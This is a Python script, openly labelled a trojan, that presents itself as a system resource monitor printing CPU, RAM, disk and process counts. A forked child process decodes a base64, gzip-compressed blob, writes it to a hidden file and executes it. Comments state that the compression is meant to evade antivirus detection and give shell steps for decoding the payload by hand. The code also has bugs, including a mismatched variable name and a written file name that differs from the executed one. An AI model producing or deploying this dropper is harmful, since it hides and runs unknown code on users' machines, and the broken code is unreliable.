##!/usr/bin/python3
#
# Use with data.py
#
# To check CPU & RAM usage
import psutil
# Base64 encoding
import base64
# To exec in secs
import time
# To bypass anti-virus detection
import gzip
# Executing this malware
import os

def main():
    # Forking a child process
    pid = os.fork()

    if pid > 0:
        # Parent process
        while True:
            # % of used CPU
            cpu = psutil.cpu_percent()
            # % of used RAM
            ram = psutil.virtual_memory().percent
            # % of used Disk Space
            disk = psutil.disk_usage("/").percent
            # number of all running processes
            processes_count = 0
            for _ in psutil.process_iter():
                process_count += 1
                
            # Print to Screen
            print("========================================================")
            print("| CPU usage | RAM usage | Disk usage | Running processes |")
            print("| {:02}%       | {:02}%       | {:02}%        | {}                 | ".format(int(cpu), int(ram), int(disk), processes_count))
            print("========================================================")
            
            # Sleep for 2 secs
            time.sleep(2)
    else:
        # If processes < 0
        # Then this is the Child process
        # that will exec trojan func
        trojan()

def trojan():
    malware_fd = open(".malware.py", "w")
    blob = "H4sICAncMmEAA21hdHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60TM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+qaNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4Jm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA"
    # Bash
    # echo -n "H4sICAncMmEAA21hdHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60TM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+qaNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4Jm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA" | base64 -d > data
    #
    # file data
    #
    # Change file data to .gz
    # mv data data.gz
    # Unzip
    # gunzip data.gz
    # ls -la
    # data
    malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
    malware_fd.write(malware)
    malware_fd.close()
    
    # Execute malware
    os.system("/usr/bin/python3 ./malware.py")
    
if __name__ == "__main__":
    main()